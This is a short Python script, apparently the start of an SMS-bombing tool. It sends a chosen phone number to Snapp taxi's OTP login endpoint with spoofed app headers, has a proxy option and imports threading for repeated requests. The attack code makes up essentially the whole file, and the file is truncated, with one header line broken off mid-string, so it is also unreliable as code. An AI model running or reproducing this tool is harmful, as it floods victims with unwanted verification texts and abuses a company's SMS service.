#Made_By_Defalt

import os
import time
import requests
from threading import Thread
from colorama import *

#proxy = {"https": "127.0.0.1:8000"}

print ("programmer : defalt")
print (" ")

def snap(phone):
    #snap api
    snapH = {"Host": "app.snapp.taxi", "content-length": "16", "x-app-name": "passenger-pwa", "x-app-version": "5.0.1", "app-version": "pwa", "user->
    snapD = {"cellphone":phone}
    try:
        snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD) #proxies=proxy)
        if "OK" in snapR.text:
            print (Fore.GREEN+"sended sms:)")
        else:
            print (Fore.RED+"Error!")